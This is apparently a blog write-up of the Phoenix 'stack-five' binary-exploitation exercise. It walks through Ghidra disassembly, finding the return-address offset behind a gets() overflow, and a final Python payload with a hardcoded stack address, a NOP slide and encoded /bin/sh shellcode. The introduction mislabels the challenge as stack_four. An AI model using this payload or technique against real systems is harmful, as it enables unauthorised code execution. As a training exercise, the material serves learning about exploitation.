---
title: Phoenix - stack_five, NCS
date: 2026-06-26 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix stack_five challenge
toc: true
---

## Introduction
I will be explaining how i did the challenge stack_four from the series Phoenix found at <https://exploit.education/phoenix/stack-four/> but without referencing the source code this time. 


## Disassembling it
Firstly, i loaded the binary `stack-five.elf` using Ghidra, followed by jumping to the starting function and selecting graph view.

![](assets/posts/PWN/phoenix_stack_five_ncs/fg1.png)

__main__ calls the function __start_level__ as shown below.

![](assets/posts/PWN/phoenix_stack_five_ncs/fg2.png)

The goal of this challenge is to execute `/bin/sh`. As the function _gets_ is used here, i will buffer overflow it, overwriting the top of the stack when __ret__ is called later on as shown below. This should point to my NOP slide in my shellcode. 

![](assets/posts/PWN/phoenix_stack_five_ncs/hint1.png)

## Testing out my payload
My initial payload as shown below is to determine where to place the target address. 

```
import sys
changeme = b"A"* 132 # init
changeme += b"bbbbccccddddeeeeffffgggghhhhh" # payload address here
sys.stdout.buffer.write(changeme)
```

![](assets/posts/PWN/phoenix_stack_five_ncs/hint2.png)


Based on the above results, i must place the target address at byte 140. The target address will be the address on the stack in the middle of a NOP slide. Hence my script to generate the payload will be:

## Finalising the payload 
Bellow is the finalised payload for this challenge.
```
import sys
changeme = b"A"* 132 # init
changeme += b"bbbbcccc" # buffer
changeme += b"\xd0\xd4\xff\xff"
changeme += b"\x90" * 200 # NOP slide
# start of shellcode
changeme +=  b""
changeme += b"\xdb\xdd\xbd\xa8\x87\xcb\xe2\xd9\x74\x24\xf4\x5e"
changeme += b"\x31\xc9\xb1\x0b\x31\x6e\x1a\x03\x6e\x1a\x83\xee"
changeme += b"\xfc\xe2\x5d\xed\xc0\xba\x04\xa0\xb0\x52\x1b\x26"
changeme += b"\xb4\x44\x0b\x87\xb5\xe2\xcb\xbf\x16\x91\xa2\x51"
changeme += b"\xe0\xb6\x66\x46\xfa\x38\x86\x96\xd4\x5a\xef\xf8"
changeme += b"\x05\xe8\x87\x04\x0d\x5d\xde\xe4\x7c\xe1"
sys.stdout.buffer.write(changeme)
```
![](assets/posts/PWN/phoenix_stack_five_ncs/flag.png)









